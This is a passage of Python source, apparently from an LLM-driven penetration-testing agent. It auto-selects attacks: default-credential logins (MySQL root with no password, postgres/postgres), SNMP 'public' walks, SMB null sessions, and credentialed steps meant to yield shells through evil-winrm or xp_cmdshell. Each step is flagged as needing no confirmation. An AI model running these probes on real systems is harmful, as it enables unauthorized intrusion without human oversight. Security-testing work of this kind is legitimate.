            if cand and "." in cand and len(cand) >= 4 and not cand[0].isdigit():
                return cand
        return ""

    @classmethod
    def _resolve_ad_domain(cls, intel: dict, fallback: str = "") -> str:
        """Find the AD DNS domain from any source the recon phase has
        populated.  Priority:
          1. intel['domain']  (already-merged structured field)
          2. intel['ad']['dns_domain']  (set by primer's own auto-stamp)
          3. intel['services'][*]['domain']
          4. Live regex sweep over intel['raw_outputs']  ← new: catches
             rdp-ntlm-info, crackmapexec banner, ldap rootDSE, etc.
          5. fallback (often blank)

        When the regex sweep finds a domain, it stamps intel['domain'] and
        intel['ad']['dns_domain'] so subsequent calls and other components
        get O(1) lookup without re-scanning raw outputs.
        """
        d = (intel.get("domain") or "").strip()
        if d:
            return d
        ad = intel.get("ad") or {}
        if isinstance(ad, dict):
            d = (ad.get("dns_domain") or ad.get("domain") or "").strip()
            if d:
                return d
        services = intel.get("services") or {}
        if isinstance(services, dict):
            services_iter = services.values()
        else:
            services_iter = services
        for svc in services_iter:
            if not isinstance(svc, dict):
                continue
            d = (svc.get("domain") or svc.get("dns_domain") or "").strip()
            if d:
                return d
        # Live sweep
        d = cls._scan_raw_outputs_for_domain(intel)
        if d:
            intel["domain"] = d
            intel.setdefault("ad", {})["dns_domain"] = d
            return d
        return fallback

    @staticmethod
    def _domain_to_base_dn(domain: str) -> str:
        """garfield.htb → DC=garfield,DC=htb."""
        if not domain:
            return ""
        parts = [p for p in domain.split(".") if p]
        return ",".join(f"DC={p}" for p in parts)

    def _next_credentialed_primer(
        self,
        *, intel:           dict,
        target:             str,
        used_tools:         Dict[str, int],
        negative_memory:    NegativeMemory,
    ) -> Optional[JustifiedAction]:
        """Return the next credentialed primer step that has not yet
        fired and whose required port is open.  Works for any service
        type — SSH, AD (SMB/WinRM/RDP/LDAP/Kerberos), databases (MySQL,
        Postgres, MSSQL, MongoDB, Redis, Elasticsearch), web auth, SMTP.

        Returns None when:
          - no creds in operator_notes, OR
          - none of the primer ports are open on the target, OR
          - every applicable primer step has already fired this session.

        AD-specific steps that need {domain} / {base_dn} skip themselves
        when those values are unfilled — so a Linux SSH-only target
        never tries to kerberoast.
        """
        creds = self._extract_credentials(intel)
        if not creds:
            return None

        # Open ports — same parsing as unauth primer
        open_ports: set = set()
        for p in (intel.get("open_ports") or []):
            if isinstance(p, dict):
                pp = p.get("port")
                if pp is not None:
                    open_ports.add(str(pp))
            else:
                open_ports.add(str(p).split("/")[0])

        if not open_ports:
            return None

        # Resolve domain (only meaningful for AD steps; harmless for others).
        domain = creds.get("domain") or self._resolve_ad_domain(intel)
        if domain and not creds.get("domain"):
            creds["domain"] = domain
        base_dn = self._domain_to_base_dn(domain)

        # Track fired per-session
        fired = intel.setdefault("_cred_primers_fired", set())
        if isinstance(fired, list):
            fired = set(fired)
            intel["_cred_primers_fired"] = fired

        # Stash the parsed creds on intel so other components (extractors,
        # post-ex agents) can read them without re-parsing notes.  Two
        # locations: ad{} for AD-aware code, credentials[] for generic
        # consumers (web, db, ssh subagents).
        intel.setdefault("ad", {}).update({
            "user":     creds.get("user", ""),
            "password": creds.get("pass", ""),
            "dns_domain": domain,
            "base_dn":  base_dn,
        })
        cred_list = intel.setdefault("credentials", [])
        if isinstance(cred_list, list):
            entry = {
                "user":     creds.get("user", ""),
                "password": creds.get("pass", ""),
                "domain":   domain,
                "source":   "operator_notes",
            }
            if entry not in cred_list:
                cred_list.append(entry)

        for primer in self._CRED_PRIMERS:
            # Need at least one of the listed ports open
            if not (set(primer["ports"]) & open_ports):
                continue
            primer_key = primer["chain"]
            if primer_key in fired:
                continue
            tool = primer["tool"]
            svc  = primer["service_label"]

            # Skip if a placeholder needed by this primer is unfilled.
            # {domain} and {base_dn} are AD-only; defer them until recon
            # has populated the domain.  Everything else (target/user/
            # pass/dc_ip) is always available when creds were extracted.
            if "{domain}" in primer["args"] and not domain:
                continue
            if "{base_dn}" in primer["args"] and not base_dn:
                continue

            try:
                args_filled = primer["args"].format(
                    target  = target,
                    user    = creds["user"],
                    **{"pass": creds["pass"]},
                    domain  = domain,
                    dc_ip   = target,
                    base_dn = base_dn,
                )
            except Exception:
                continue

            # Negative-memory check — if this exact (tool, service, args) failed
            # already, mark fired and move on.
            if negative_memory.has_failed_before(tool, svc, args=args_filled):
                fired.add(primer_key)
                continue

            fired.add(primer_key)

            return JustifiedAction(
                action_id            = f"cred-primer-{primer_key}",
                tool                 = tool,
                args                 = args_filled,
                target_service       = svc,
                reason               = (
                    f"[Cred-Primer/{primer_key}] credentialed step — "
                    f"{primer['rationale']}"
                ),
                expected_outcome = (
                    "Successful authentication / shell / data listing — "
                    "or definitive 'access denied' to flag this primer dead."
                ),
                success_criteria = (
                    "Tool exits 0 with non-error output. "
                    "Shell-producing tools (sshpass+ssh, evil-winrm, "
                    "impacket-mssqlclient via xp_cmdshell) trigger a real "
                    "register_shell when the output contains uid= / Pwn3d! / "
                    "session-opened evidence."
                ),
                hypothesis_id        = "cred-primer",
                confidence           = 0.92,
                requires_confirmation= False,
            )

        return None

    # Backwards-compat alias — older callers may still reference the
    # original AD-only name; keep the symbol callable.
    _next_credentialed_ad_primer = _next_credentialed_primer

    # ── Recommendation E: foothold-primer auto-promotion ──────────────────

    # Map of (port → (chain_id, tool, args_template)) — the read-only first
    # step of each cheap-foothold primer chain.  These run before any
    # LLM-proposed action whenever their port is open and they haven't
    # yet fired this session.  Args use a bare {target} placeholder.
    _FOOTHOLD_PRIMERS: List[Dict[str, Any]] = [
        # FTP anonymous probe
        {"chain": "ftp_anonymous_login", "ports": ["21"],
         "tool": "nmap", "args": "--script ftp-anon -p21 {target}",
         "service_label": "ftp:21",
         "rationale": "vsftpd/proftpd routinely ship with anon-read enabled"},
        # Telnet — passive nmap probe (no brute on first iteration)
        {"chain": "telnet_default_creds", "ports": ["23"],
         "tool": "nmap", "args": "-sV -p23 --script banner {target}",
         "service_label": "telnet:23",
         "rationale": "telnet banner often leaks default-creds product family"},
        # SNMP public walk
        {"chain": "snmp_public_v2c_walk", "ports": ["161"],
         "tool": "snmpwalk", "args": "-v 2c -c public {target}",
         "service_label": "snmp:161",
         "rationale": "default community 'public' leaks users + processes"},
        # SMB null-session enum
        {"chain": "smb_anonymous_enum", "ports": ["139", "445"],
         "tool": "smbclient", "args": "-L //{target}/ -N",
         "service_label": "smb:445",
         "rationale": "null-session shares + user enum still works on many boxes"},
        # MySQL empty-password root
        {"chain": "db_default_creds_quick", "ports": ["3306"],
         "tool": "mysql", "args": "-h {target} -u root -e 'SHOW DATABASES;'",
         "service_label": "mysql:3306",
         "rationale": "lab boxes often leave root/'' enabled"},
        # Postgres default
        {"chain": "db_default_creds_quick", "ports": ["5432"],
         "tool": "psql", "args": "-h {target} -U postgres -c '\\l' -W postgres",
         "service_label": "postgresql:5432",
         "rationale": "default postgres/postgres credentials"},
        # MongoDB unauth
        {"chain": "db_default_creds_quick", "ports": ["27017"],
         "tool": "mongosh", "args": "--host {target} --eval 'db.adminCommand({listDatabases:1})'",
         "service_label": "mongodb:27017",
         "rationale": "unauthenticated Mongo on default port"},
        # Redis unauth
        {"chain": "redis_unauth_to_shell", "ports": ["6379"],
         "tool": "redis-cli", "args": "-h {target} ping",
         "service_label": "redis:6379",
         "rationale": "unauthenticated Redis ping → write-key foothold"},
    ]

    def _next_unused_foothold_primer(
        self,
        *, intel:           dict,
        target:             str,
        used_tools:         Dict[str, int],
        negative_memory:    NegativeMemory,
    ) -> Optional[JustifiedAction]:
        """Return a primer action if any open service has a primer that
        has not yet fired and was not already banned.  None otherwise.

        The intent is "always knock on the obvious doors before invoking
        the heavyweight planner".  Once every applicable primer has run
        once, this returns None forever (per session) and the normal
        LLM-driven planner takes over.
        """
        # Open ports — accept ints or strings or {port:..} dicts.
        open_ports: set = set()
        for p in (intel.get("open_ports") or []):
            if isinstance(p, dict):
                pp = p.get("port")
                if pp is not None:
                    open_ports.add(str(pp))
            else:
                open_ports.add(str(p).split("/")[0])

        if not open_ports:
            return None

        # Track which primers have already fired this session via a
        # state key on intel (reset on session-start).
        fired = intel.setdefault("_foothold_primers_fired", set())
        if isinstance(fired, list):
            fired = set(fired)
            intel["_foothold_primers_fired"] = fired

        for primer in self._FOOTHOLD_PRIMERS:
            if not (set(primer["ports"]) & open_ports):
                continue
            primer_key = primer["chain"] + ":" + primer["service_label"]
            if primer_key in fired:
                continue
            tool = primer["tool"]
            svc  = primer["service_label"]
            # Respect negative memory — if this exact probe failed already,
            # skip it (saves a round-trip on a confirmed-dead service).
            try:
                args_filled = primer["args"].format(target=target)
            except Exception:
                args_filled = primer["args"]
            if negative_memory.has_failed_before(tool, svc, args=args_filled):
                # Mark fired so we don't re-evaluate it next iteration.
                fired.add(primer_key)
                continue

            # Mark fired pre-emptively so a slow listener / repeated
            # select_action call doesn't re-issue the same primer.
            fired.add(primer_key)

            return JustifiedAction(
                action_id            = f"primer-{primer['chain']}-{primer['service_label']}",
                tool                 = tool,
                args                 = args_filled,
                target_service       = svc,
                reason               = (
                    f"[Primer/{primer['chain']}] cheap-unauth probe before LLM "
                    f"planner — {primer['rationale']}"
                ),
                expected_outcome     = "Primer banner / version / share list / unauth confirmation",
                success_criteria     = "Tool exits 0 with non-error output indicating service responds",
                hypothesis_id        = "primer",
                confidence           = 0.85,
                requires_confirmation= False,
            )
        return None

    def _build_reason(self, hypothesis: Hypothesis) -> str:
        """Format a justification string from a hypothesis."""
        evidence = " | ".join(hypothesis.evidence_supporting[:2])
        return (
            f"Hypothesis: {hypothesis.statement[:80]}. "
            f"Confidence: {hypothesis.confidence:.2f}. "
            f"Evidence: {evidence}"
        )

    def _build_success_criteria(self, hypothesis: Hypothesis) -> str:
        """Derive success criteria from the hypothesis required_evidence."""
        if hypothesis.required_evidence:
            return "Confirm: " + " AND ".join(hypothesis.required_evidence[:2])
        return "Hypothesis validated — action produced expected output"

    async def _emit_reasoning(self, message: str) -> None:
        """Emit a reasoning trace event to the frontend."""
        try:
            if callable(self._emit):
                await self._emit({
                    "type":       "reasoning_decision",
                    "session_id": self._session_id,
                    "agent":      "master",
                    "data":       {"message": message, "component": "decision_engine"},
                })
        except Exception:
            pass

    async def _emit_voi_ranking(self, ranked: List[Dict[str, Any]]) -> None:
        """Emit the top-N VoI-ranked candidates so the operator can see *why*
        a particular action was chosen and what runners-up were considered."""
        try:
            if not callable(self._emit):
                return
            payload = []
            for r in ranked:
                payload.append({
                    "tool":           r.get("tool"),
                    "args":           r.get("args"),
                    "target_service": r.get("target_service"),
                    "action_str":     r.get("action_str"),
                    "voi_score":      r.get("voi_score"),
                    "voi_factors":    r.get("voi_factors") or {},
                    "voi_reasons":    r.get("voi_reasons") or [],
                    "voi_dropped":    bool(r.get("voi_dropped", False)),
                    "confidence":     r.get("confidence"),
                })
            await self._emit({
                "type":       "voi_ranking",
                "session_id": self._session_id,
                "agent":      "master",
                "data":       {"top": payload, "count": len(payload)},
            })
        except Exception:
            pass

    async def _emit_action(self, action: JustifiedAction) -> None:
        """Emit a justified_action event to the frontend."""
        try:
            if callable(self._emit):
                await self._emit({
                    "type":       "justified_action",
                    "session_id": self._session_id,
                    "agent":      "master",
                    "data":       action.to_dict(),
                })
        except Exception:
            pass
